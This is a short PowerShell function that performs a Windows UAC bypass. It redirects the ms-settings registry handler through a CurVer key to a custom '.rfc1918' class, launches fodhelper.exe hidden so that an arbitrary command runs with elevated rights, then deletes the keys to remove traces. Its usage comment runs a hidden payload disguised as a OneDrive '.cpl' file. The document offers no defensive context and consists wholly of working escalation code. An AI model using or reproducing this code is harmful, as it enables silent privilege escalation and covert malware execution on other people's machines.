function uac_fod {
    param (
        [string]$command
    )
    # uac_fod -command 'powershell -WindowStyle hidden -c "c:\Users\User\Appdata\Local\Microsoft\OneDrive\OneDriveUpdates.cpl"'

    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue

    New-Item "HKCU:\Software\Classes\.rfc1918\Shell\Open\command" -Force
	New-ItemProperty -Path "HKCU:\Software\Classes\.rfc1918\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty "HKCU:\Software\Classes\.rfc1918\Shell\Open\command" -Name "(default)" -Value $command -Force

    New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
    Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".rfc1918" -Force

    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    Start-Sleep 3
	
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
    Remove-Item "HKCU:\Software\Classes\.rfc1918\" -Recurse -Force
}
